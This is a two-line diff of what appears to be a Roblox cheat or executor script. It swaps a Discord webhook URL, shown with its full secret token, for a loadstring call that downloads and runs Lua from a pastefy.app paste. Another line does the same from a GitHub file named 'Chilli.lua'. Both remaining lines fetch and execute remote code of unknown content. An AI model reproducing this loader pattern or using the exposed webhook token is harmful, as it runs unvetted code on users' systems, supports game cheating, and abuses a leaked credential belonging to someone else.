@@ -1,2 +1,2 @@
-https://discord.com/api/webhooks/1441339154914086992/FUCxTBYuEMiG2P8VbpIX5R5ufBzRpJ5e944thLFVeRKWfMj0lXC0Rw-zJupt0Y6MeLRA
+loadstring(game:HttpGet("https://pastefy.app/LD68KdIZ/raw", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
